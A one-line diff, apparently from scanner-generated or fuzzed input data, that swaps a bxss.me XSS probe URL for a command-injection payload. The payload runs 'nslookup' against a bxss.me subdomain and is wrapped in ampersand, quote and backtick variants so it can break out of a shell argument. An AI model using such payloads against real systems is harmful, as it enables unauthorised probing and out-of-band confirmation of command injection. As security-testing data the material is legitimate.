@@ -1,1 +1,1 @@
-HttP://bxss.me/t/xss.html?%00
+&nslookup -q=cname hithizmaaqwydf13b3.bxss.me&'\"`0&nslookup -q=cname hithizmaaqwydf13b3.bxss.me&`'
